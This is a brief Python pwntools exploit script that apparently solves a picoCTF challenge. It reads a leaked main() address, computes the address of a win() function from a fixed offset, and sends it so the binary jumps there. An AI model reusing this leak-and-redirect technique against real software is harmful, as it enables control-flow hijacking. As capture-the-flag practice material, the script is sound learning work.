#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("vuln")
p = process()

#p = remote("rescued-float.picoctf.net", 56982)

l = p.recvline()

l = l.split(b" ")

addOfMain = l[3][:-1].decode("utf-8")

print("main: " + addOfMain)

offset = 0x55555555533d - 0x5555555552a7

mainInt = int(addOfMain, 16)
win = mainInt-offset

print("presumed win(): " + str(hex(win)))

p.recvuntil(b"Enter the address to jump to, ex => 0x12345:")
p.sendline(str(hex(win)))

p.interactive()

#0x5555555552a7 - WIN
#0x55555555533d - MAIN
